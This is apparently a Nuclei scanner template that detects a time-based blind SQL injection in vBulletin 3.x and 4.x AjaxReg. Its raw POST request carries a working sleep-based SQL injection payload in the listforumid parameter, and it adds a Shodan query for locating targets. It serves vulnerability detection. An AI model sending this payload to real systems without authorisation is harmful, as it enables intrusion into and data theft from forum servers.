http:
- host-redirects: true
  matchers:
  - condition: and
    dsl:
    - duration>=6
    - status_code == 200
    - contains_any(header, "bb_lastvisit", "bb_sessionhash")
    type: dsl
  max-redirects: 3
  raw:
  - '@timeout: 20s

    POST /ajax.php?do=inforum&listforumid=(select(0)from(select(sleep(6)))v)/*''%2B(select(0)from(select(sleep(6)))v)%2B''"%2B(select(0)from(select(sleep(6)))v)%2B"*/&result=10
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    undefined&s=&securitytoken=guest

    '
id: vbulletin-ajaxreg-sqli
info:
  author: mastercho
  classification:
    cpe: cpe:2.3:a:vbulletin:vbulletin:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
  description: 'vBulletin versions 3.x and 4.x suffer from an AjaxReg remote blind
    SQL injection vulnerability.

    '
  metadata:
    max-request: 1
    product: vbulletin
    shodan-query: http.component:"vBulletin"
    vendor: vbulletin
    verified: true
  name: vBulletin 3.x / 4.x AjaxReg - SQL Injection
  reference:
  - https://packetstormsecurity.com/files/118703/vBulletin-3.x-4.x-AjaxReg-SQL-Injection.html
  severity: critical
  tags: time-based-sqli,packetstorm,vbulletin,ajaxreg,sqli,vuln
